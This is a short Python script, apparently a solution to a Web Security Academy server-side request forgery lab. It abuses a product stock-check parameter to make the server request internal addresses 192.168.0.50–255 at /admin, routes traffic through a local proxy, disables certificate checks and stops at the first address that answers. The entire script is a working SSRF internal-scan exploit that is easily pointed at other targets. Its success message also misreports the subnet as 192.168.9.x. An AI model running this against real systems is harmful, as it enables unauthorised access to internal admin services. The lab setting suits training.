import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URL = "https://0a7d0041047b0f84c4ed018800f60061.web-security-academy.net/product/stock"

for i in range (50, 256):
    data = {"stockApi" : "http://192.168.0.%i:8080/admin"   %i} 
    r = requests.post(URL, data=data, verify=False, proxies=proxies)
    if "Internal Server Error" in r.text:
        print("Currently at %i..." %i)
    else:
        print("Found! 192.168.9.%i is a valid IP address!" %i)
        break